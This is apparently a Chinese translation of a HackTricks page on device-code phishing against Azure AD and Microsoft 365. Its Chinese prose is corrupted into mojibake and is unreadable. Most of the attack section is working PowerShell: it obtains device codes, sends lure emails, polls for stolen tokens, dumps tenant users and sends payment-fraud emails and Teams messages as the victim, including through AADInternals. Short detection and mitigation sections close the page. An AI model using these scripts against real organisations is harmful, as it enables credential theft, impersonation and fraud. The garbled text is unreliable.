# Az - è®¾å¤‡ä»£ç èº«ä»½éªŒè¯é’“é±¼

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

**æœ¬æ–‡æ‘˜è‡ª** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)****

### ä»€ä¹ˆæ˜¯è®¾å¤‡ä»£ç èº«ä»½éªŒè¯ <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

æ ¹æ®å¾®è½¯[æ–‡æ¡£](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)ï¼Œè®¾å¤‡ä»£ç èº«ä»½éªŒè¯ï¼š

> å…è®¸ç”¨æˆ·ç™»å½•åˆ°è¾“å…¥å—é™çš„è®¾å¤‡ï¼Œå¦‚æ™ºèƒ½ç”µè§†ã€ç‰©è”ç½‘è®¾å¤‡æˆ–æ‰“å°æœºã€‚ä¸ºäº†å¯ç”¨è¿™ç§æµç¨‹ï¼Œè®¾å¤‡è®©ç”¨æˆ·åœ¨å¦ä¸€å°è®¾å¤‡çš„æµè§ˆå™¨ä¸­è®¿é—®ç½‘é¡µè¿›è¡Œç™»å½•ã€‚ä¸€æ—¦ç”¨æˆ·ç™»å½•ï¼Œè®¾å¤‡å°±èƒ½æ ¹æ®éœ€è¦è·å–è®¿é—®ä»¤ç‰Œå’Œåˆ·æ–°ä»¤ç‰Œã€‚

è¿‡ç¨‹å¦‚ä¸‹ï¼š

1. ç”¨æˆ·åœ¨è®¾å¤‡ä¸Šå¯åŠ¨æ”¯æŒè®¾å¤‡ä»£ç æµçš„åº”ç”¨
2. åº”ç”¨è¿æ¥åˆ°Azure AD /devicecodeç«¯ç‚¹å¹¶å‘é€ **client\_id** å’Œ **resource**
3. Azure AD å‘å› **device\_code**ã€**user\_code** å’Œ **verification\_url**
4. è®¾å¤‡æ˜¾ç¤º **verification\_url** (hxxps://microsoft.com/devicelogin) å’Œç”¨æˆ·æä¾›çš„ **user\_code**
5. ç”¨æˆ·æ‰“å¼€æµè§ˆå™¨ï¼Œå¯¼èˆªåˆ° **verification\_url**ï¼Œåœ¨è¢«è¯¢é—®æ—¶æä¾› **user\_code** å¹¶ç™»å½•
6. è®¾å¤‡è½®è¯¢Azure ADï¼ŒæˆåŠŸç™»å½•åè·å– **access\_token** å’Œ **refresh\_token**

![è®¾å¤‡ä»£ç æµç¨‹](https://o365blog.com/images/posts/phishing\_5.png)

### ä½¿ç”¨è®¾å¤‡ä»£ç èº«ä»½éªŒè¯è¿›è¡Œé’“é±¼ <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

åˆ©ç”¨è®¾å¤‡ä»£ç èº«ä»½éªŒè¯è¿›è¡Œé’“é±¼çš„åŸºæœ¬æ€è·¯å¦‚ä¸‹ã€‚

1. æ”»å‡»è€…è¿æ¥åˆ°/devicecodeç«¯ç‚¹å¹¶å‘é€ **client\_id** å’Œ **resource**
2. æ”¶åˆ° **verification\_uri** å’Œ **user\_code** åï¼Œåˆ›å»ºä¸€å°åŒ…å«æŒ‡å‘ **verification\_uri** å’Œ **user\_code** çš„é“¾æ¥çš„ç”µå­é‚®ä»¶ï¼Œå¹¶å‘é€ç»™å—å®³è€…ã€‚
3. å—å®³è€…ç‚¹å‡»é“¾æ¥ï¼Œæä¾›ä»£ç å¹¶å®Œæˆç™»å½•ã€‚
4. æ”»å‡»è€…æ¥æ”¶ **access\_token** å’Œ **refresh\_token**ï¼Œç°åœ¨å¯ä»¥æ¨¡ä»¿å—å®³è€…ã€‚

#### 1. è¿æ¥åˆ°/devicecodeç«¯ç‚¹ <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

ç¬¬ä¸€æ­¥æ˜¯å¯¹Azure AD devicecodeç«¯ç‚¹è¿›è¡Œhttp POSTï¼š
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
æˆ‘ä½¿ç”¨äº†ä»¥ä¸‹å‚æ•°ã€‚æˆ‘é€‰æ‹©ä½¿ç”¨â€œMicrosoft Officeâ€ client\_idï¼Œå› ä¸ºå®ƒçœ‹èµ·æ¥æ˜¯æœ€åˆæ³•çš„åº”ç”¨ç¨‹åºåç§°ï¼Œå¹¶ä¸”å®ƒä¹Ÿå¯ä»¥ç”¨æ¥è®¿é—®å…¶ä»–èµ„æºã€‚æ‰€é€‰èµ„æºå…è®¸è®¿é—®AAD Graph APIï¼Œè¯¥APIè¢«MSOnline PowerShellæ¨¡å—ä½¿ç”¨ã€‚

| å‚æ•°        | å€¼                                                      |
| ---------- | ------------------------------------------------------- |
| client\_id | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource   | [https://graph.windows.net](https://graph.windows.net/) |

å“åº”ç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| å‚æ•°              | æè¿°                                                                   |
| ----------------- | ---------------------------------------------------------------------- |
| user\_code        | ç”¨æˆ·åœ¨è¢«è¯·æ±‚æ—¶éœ€è¦è¾“å…¥çš„ä»£ç                                            |
| device\_code      | ç”¨äºâ€œè½®è¯¢â€è®¤è¯ç»“æœçš„è®¾å¤‡ä»£ç                                           |
| verification\_url | ç”¨æˆ·éœ€è¦æµè§ˆä»¥è¿›è¡Œè®¤è¯çš„ç½‘å€                                           |
| expires\_in       | è¿‡æœŸæ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ï¼ˆ15åˆ†é’Ÿï¼‰                                         |
| interval          | å®¢æˆ·ç«¯åº”å¤šä¹…è½®è¯¢ä¸€æ¬¡è®¤è¯çš„æ—¶é—´é—´éš”ï¼Œä»¥ç§’ä¸ºå•ä½                         |
| message           | éœ€è¦æ˜¾ç¤ºç»™ç”¨æˆ·çš„é¢„æ ¼å¼åŒ–æ¶ˆæ¯                                           |

ä»¥ä¸‹æ˜¯è¿æ¥åˆ° devicelogin ç«¯ç‚¹çš„è„šæœ¬ï¼š
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**æ³¨æ„ï¼** æˆ‘ä½¿ç”¨çš„æ˜¯1.0ç‰ˆæœ¬ï¼Œè¿™ä¸[æ–‡æ¡£](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)ä¸­ä½¿ç”¨çš„v2.0æµç¨‹ç•¥æœ‰ä¸åŒã€‚

#### 2. åˆ›å»ºé’“é±¼é‚®ä»¶ <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

ç°åœ¨æˆ‘ä»¬æœ‰äº†**verification\_url**ï¼ˆå§‹ç»ˆç›¸åŒï¼‰å’Œ**user\_code**ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºå¹¶å‘é€é’“é±¼é‚®ä»¶ã€‚

**æ³¨æ„ï¼** å‘é€é‚®ä»¶éœ€è¦ä¸€ä¸ªå¯ç”¨çš„smtpæœåŠ¡ã€‚

ä»¥ä¸‹æ˜¯å‘å—å®³è€…å‘é€é’“é±¼é‚®ä»¶çš„è„šæœ¬ï¼š
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
æ”¶åˆ°çš„ç”µå­é‚®ä»¶çœ‹èµ·æ¥åƒè¿™æ ·ï¼š ![Device Code flow](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. â€œæ•é±¼â€ - å—å®³è€…æ‰§è¡Œè®¤è¯ <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

å½“å—å®³è€…ç‚¹å‡»é“¾æ¥æ—¶ï¼Œä¼šå‡ºç°ä»¥ä¸‹ç½‘ç«™ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªurlæ˜¯ä¸€ä¸ªåˆæ³•çš„Microsoft urlã€‚ç”¨æˆ·è¢«è¦æ±‚è¾“å…¥ç”µå­é‚®ä»¶ä¸­çš„ä»£ç ã€‚

![Device code](https://o365blog.com/images/posts/phishing\_7.png)

è¾“å…¥ä»£ç åï¼Œç”¨æˆ·è¢«è¦æ±‚é€‰æ‹©ä¸€ä¸ªç”¨æˆ·è¿›è¡Œç™»å½•ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·è¢«è¦æ±‚ç™»å½•åˆ° **Microsoft Office** - æ²¡æœ‰è¦æ±‚ä»»ä½•åŒæ„ã€‚

**æ³¨æ„ï¼** å¦‚æœç”¨æˆ·æ²¡æœ‰ç™»å½•ï¼Œç”¨æˆ·éœ€è¦ä½¿ç”¨ç›®æ ‡ç»„ç»‡æ­£åœ¨ä½¿ç”¨çš„ä»»ä½•æ–¹æ³•ç™»å½•ã€‚

![Login](https://o365blog.com/images/posts/phishing\_8.png)

æˆåŠŸè®¤è¯åï¼Œç”¨æˆ·ä¼šçœ‹åˆ°ä»¥ä¸‹å†…å®¹ã€‚

![Profit](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **æ­¤æ—¶ç”¨æˆ·çš„èº«ä»½å·²ç»æ³„éœ²ï¼** :warning:

#### 4. æ£€ç´¢è®¿é—®ä»¤ç‰Œ <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

å¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œæœ€åä¸€æ­¥æ˜¯æ£€ç´¢è®¿é—®ä»¤ç‰Œã€‚å®Œæˆç¬¬2æ­¥åï¼Œæ”»å‡»è€…å¼€å§‹è½®è¯¢Azure ADä»¥è·å–è®¤è¯çŠ¶æ€ã€‚

æ”»å‡»è€…éœ€è¦æ¯5ç§’å‘Azure ADä»¤ç‰Œç«¯ç‚¹å‘èµ·ä¸€ä¸ªhttp POSTè¯·æ±‚ï¼š
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
è¯·æ±‚å¿…é¡»åŒ…å«ä»¥ä¸‹å‚æ•°ï¼ˆcode æ˜¯ç¬¬ä¸€æ­¥ä¸­çš„ device_codeï¼‰

| å‚æ•°        | å€¼                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client_id   | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA |
| grant_type  | urn:ietf:params:oauth:grant-type:device_code                                                                                                                                                                    |

å¦‚æœè®¤è¯å¤„äºç­‰å¾…çŠ¶æ€ï¼Œå°†è¿”å› http é”™è¯¯ **400 Bad Request**ï¼Œå†…å®¹å¦‚ä¸‹ï¼š
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
ç™»å½•æˆåŠŸåï¼Œæˆ‘ä»¬å°†å¾—åˆ°ä»¥ä¸‹å“åº”ï¼ˆä»¤ç‰Œå·²æˆªæ–­ï¼‰ï¼š
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
ä»¥ä¸‹è„šæœ¬è¿æ¥åˆ°Azure ADä»¤ç‰Œç«¯ç‚¹å¹¶è½®è¯¢è®¤è¯çŠ¶æ€ã€‚
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è®¿é—®ä»¤ç‰Œæ¥å†’å……å—å®³è€…ï¼š
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œè·å–å¯¹å…¶ä»–æœåŠ¡çš„è®¿é—®ä»¤ç‰Œï¼Œåªè¦ client\_id ä¿æŒä¸å˜ã€‚

ä»¥ä¸‹è„šæœ¬ç”¨äºè·å– Exchange Online çš„è®¿é—®ä»¤ç‰Œã€‚
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## ä½¿ç”¨AADInternalsè¿›è¡Œç½‘ç»œé’“é±¼ <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternalsï¼ˆv0.4.4æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰å…·æœ‰ä¸€ä¸ª[Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing)åŠŸèƒ½ï¼Œå®ƒå¯ä»¥è‡ªåŠ¨åŒ–ç½‘ç»œé’“é±¼è¿‡ç¨‹ã€‚

é’“é±¼ä¿¡æ¯å¯ä»¥è‡ªå®šä¹‰ï¼Œä»¥ä¸‹æ˜¯é»˜è®¤ä¿¡æ¯ï¼š
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
### ç”µå­é‚®ä»¶ <a href="#email" id="email"></a>

ä»¥ä¸‹ç¤ºä¾‹é€šè¿‡ä½¿ç”¨è‡ªå®šä¹‰æ¶ˆæ¯å‘é€é’“é±¼ç”µå­é‚®ä»¶ã€‚ä»¤ç‰Œè¢«ä¿å­˜åˆ°ç¼“å­˜ä¸­ã€‚
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¼“å­˜çš„ä»¤ç‰Œä½œä¸ºå—å®³è€…å‘é€ç”µå­é‚®ä»¶ã€‚
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
æˆ‘ä»¬è¿˜å¯ä»¥å‘é€ä¸€ä¸ªTeamsæ¶ˆæ¯ï¼Œä½¿ä»˜æ¬¾è¯·æ±‚æ›´åŠ ç´§è¿«ï¼š
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**ä»¥ä¸‹è§†é¢‘å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨AADInternalsè¿›è¡Œç”µå­é‚®ä»¶ç½‘ç»œé’“é±¼ã€‚**

### Teams <a href="#teams" id="teams"></a>

AADInternalsæ”¯æŒå‘é€ç½‘ç»œé’“é±¼ä¿¡æ¯ä½œä¸ºTeamsèŠå¤©æ¶ˆæ¯ã€‚

**æ³¨æ„ï¼** å—å®³è€…â€œè®¤è¯â€åå¹¶ä¸”ä»¤ç‰Œè¢«æ¥æ”¶ï¼ŒAADInternalså°†æ›¿æ¢åŸå§‹æ¶ˆæ¯ã€‚è¿™æ¡æ¶ˆæ¯å¯ä»¥é€šè¿‡-CleanMessageå‚æ•°æä¾›ã€‚

é»˜è®¤çš„æ¸…æ´æ¶ˆæ¯æ˜¯ï¼š
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
```markdown
![Teams æ¸…æ™°æ¶ˆæ¯](https://o365blog.com/images/posts/phishing_13.png)

ä»¥ä¸‹ç¤ºä¾‹é€šè¿‡ä½¿ç”¨å®šåˆ¶æ¶ˆæ¯å‘é€é’“é±¼ç”µå­é‚®ä»¶ã€‚ä»¤ç‰Œè¢«ä¿å­˜åˆ°ç¼“å­˜ä¸­ã€‚
```
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**ä»¥ä¸‹è§†é¢‘å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨AADInternalsè¿›è¡ŒTeamsé’“é±¼æ”»å‡»ã€‚**

## æ£€æµ‹ <a href="#detecting" id="detecting"></a>

é¦–å…ˆï¼Œä»Azure ADçš„è§’åº¦æ¥çœ‹ï¼Œç™»å½•å‘ç”Ÿåœ¨**å¯åŠ¨**è®¤è¯çš„åœ°æ–¹ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç‚¹ã€‚è¿™æ„å‘³ç€åœ¨ç™»å½•æ—¥å¿—ä¸­ï¼Œç™»å½•æ˜¯ä»**æ”»å‡»è€…çš„ä½ç½®å’Œè®¾å¤‡**è¿›è¡Œçš„ï¼Œè€Œä¸æ˜¯ç”¨æˆ·çš„ã€‚

ç„¶è€Œï¼Œä½¿ç”¨åˆ·æ–°ä»¤ç‰Œè·å–çš„è®¿é—®ä»¤ç‰Œ**ä¸ä¼šå‡ºç°åœ¨ç™»å½•æ—¥å¿—ä¸­ï¼**

ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œæˆ‘ä»Azure VMï¼ˆæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ä»[cloud shell](https://o365blog.com/post/cloudshell/)ï¼‰å‘èµ·äº†é’“é±¼æ”»å‡»ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨â€œMicrosoft Officeâ€å®¢æˆ·ç«¯åœ¨ä¸Šåˆ7:23ä»IPåœ°å€51.144.240.233è¿›è¡Œçš„ç™»å½•ã€‚ç„¶è€Œï¼Œåœ¨ä¸Šåˆ7:27è·å–Exchange Onlineçš„è®¿é—®ä»¤ç‰Œå¹¶æ²¡æœ‰æ˜¾ç¤ºåœ¨æ—¥å¿—ä¸­ã€‚

![Azure ADç™»å½•æ—¥å¿—](https://o365blog.com/images/posts/phishing\_10.png)

:warning: å¦‚æœæœ‰è¿¹è±¡è¡¨æ˜ç”¨æˆ·ä»éå…¸å‹ä½ç½®ç™»å½•ï¼Œç”¨æˆ·è´¦æˆ·å¯èƒ½å·²ç»è¢«æ³„éœ²ã€‚

## é¢„é˜² <a href="#preventing" id="preventing"></a>

é¢„é˜²ä½¿ç”¨è¿™ç§æŠ€æœ¯çš„é’“é±¼æ”»å‡»çš„å”¯ä¸€æœ‰æ•ˆæ–¹æ³•æ˜¯ä½¿ç”¨[Conditional Access](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)ï¼ˆCAï¼‰ç­–ç•¥ã€‚å…·ä½“æ¥è¯´ï¼Œ**æ— æ³•é˜»æ­¢é’“é±¼æ”»å‡»**ï¼Œä½†æˆ‘ä»¬å¯ä»¥**é˜»æ­¢ç”¨æˆ·åŸºäºç‰¹å®šè§„åˆ™ç™»å½•**ã€‚ç‰¹åˆ«æ˜¯åŸºäºä½ç½®å’Œè®¾å¤‡çŠ¶æ€çš„ç­–ç•¥å¯¹ä¿æŠ¤è´¦æˆ·éå¸¸æœ‰æ•ˆã€‚è¿™é€‚ç”¨äºç›®å‰ä½¿ç”¨çš„æ‰€æœ‰é’“é±¼æŠ€æœ¯ã€‚

ç„¶è€Œï¼Œä¸å¯èƒ½è¦†ç›–æ‰€æœ‰æƒ…å†µã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·ä½¿ç”¨MFAç™»å½•ï¼Œé‚£ä¹ˆå¼ºåˆ¶ä»éæ³•ä½ç½®ç™»å½•çš„MFAä¸ä¼šæœ‰å¸®åŠ©ã€‚

## ç¼“è§£ <a href="#mitigating" id="mitigating"></a>

å¦‚æœç”¨æˆ·å·²ç»è¢«æ³„éœ²ï¼Œå¯ä»¥[æ’¤é”€](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0)ç”¨æˆ·çš„åˆ·æ–°ä»¤ç‰Œï¼Œè¿™å¯ä»¥é˜»æ­¢æ”»å‡»è€…ä½¿ç”¨è¢«æ³„éœ²çš„åˆ·æ–°ä»¤ç‰Œè·å–æ–°çš„è®¿é—®ä»¤ç‰Œã€‚

## æ€»ç»“ <a href="#summary" id="summary"></a>

æ®æˆ‘æ‰€çŸ¥ï¼Œè®¾å¤‡ä»£ç è®¤è¯æµç¨‹æŠ€æœ¯ä¹‹å‰æ²¡æœ‰è¢«ç”¨äºé’“é±¼æ”»å‡»ã€‚

ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§æ–¹æ³•æœ‰å‡ ä¸ªä¼˜ç‚¹ï¼š

* æ— éœ€æ³¨å†Œä»»ä½•åº”ç”¨ç¨‹åº
* æ— éœ€ä¸ºå‡ç™»å½•é¡µé¢ç­‰æ­å»ºé’“é±¼åŸºç¡€è®¾æ–½
* ç”¨æˆ·åªè¢«è¦æ±‚ç™»å½•ï¼ˆé€šå¸¸æ˜¯åˆ°â€œMicrosoft Officeâ€ï¼‰- ä¸éœ€è¦åŒæ„
* ä¸€åˆ‡éƒ½å‘ç”Ÿåœ¨**login.microsoftonline.com**å‘½åç©ºé—´
* æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»»ä½•client\_idå’Œèµ„æºï¼ˆå°½ç®¡å¹¶éæ‰€æœ‰ç»„åˆéƒ½æœ‰æ•ˆï¼‰
* å¦‚æœç”¨æˆ·ä½¿ç”¨MFAç™»å½•ï¼Œè®¿é—®ä»¤ç‰Œä¹Ÿä¼šåŒ…å«MFAå£°æ˜ï¼ˆè¿™ä¹ŸåŒ…æ‹¬ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œè·å–çš„è®¿é—®ä»¤ç‰Œï¼‰
* é˜²æ­¢éœ€è¦Conditional Accessï¼ˆå’ŒAzure AD Premium P1/P2è®¸å¯ï¼‰

ä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§æ–¹æ³•è‡³å°‘æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼š

* ç”¨æˆ·ä»£ç ä»…æœ‰æ•ˆ15åˆ†é’Ÿ

å½“ç„¶ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘å¤šä¸ªæ”¶ä»¶äººå‘é€é’“é±¼ç”µå­é‚®ä»¶æ¥å‡å°‘æ—¶é—´é™åˆ¶ - è¿™å°†å¢åŠ æœ‰äººä½¿ç”¨ä»£ç ç™»å½•çš„å¯èƒ½æ€§ã€‚

å¦ä¸€ç§æ–¹æ³•æ˜¯å®ç°[ä¸€ä¸ªä»£ç†](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333)ï¼Œå½“ç‚¹å‡»é“¾æ¥æ—¶ä¼šå¼€å§‹è®¤è¯ï¼ˆæ„Ÿè°¢[@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)ï¼‰ã€‚ç„¶è€Œï¼Œè¿™æ ·å°±å¤±å»äº†ä½¿ç”¨åˆæ³•microsoft.comç½‘å€çš„ä¼˜åŠ¿ã€‚

æŠµå¾¡é’“é±¼æ´»åŠ¨çš„æ¸…å•ï¼š

1. **æ•™è‚²ä½ çš„ç”¨æˆ·**å…³äºä¿¡æ¯å®‰å…¨å’Œé’“é±¼ :woman\_teacher:
2. ä½¿ç”¨å¤šå› ç´ è®¤è¯ï¼ˆMFAï¼‰ :iphone:
3. ä½¿ç”¨Intune :hammer\_and\_wrench: å’ŒConditional Accessï¼ˆCAï¼‰ :stop\_sign:

\

<details>

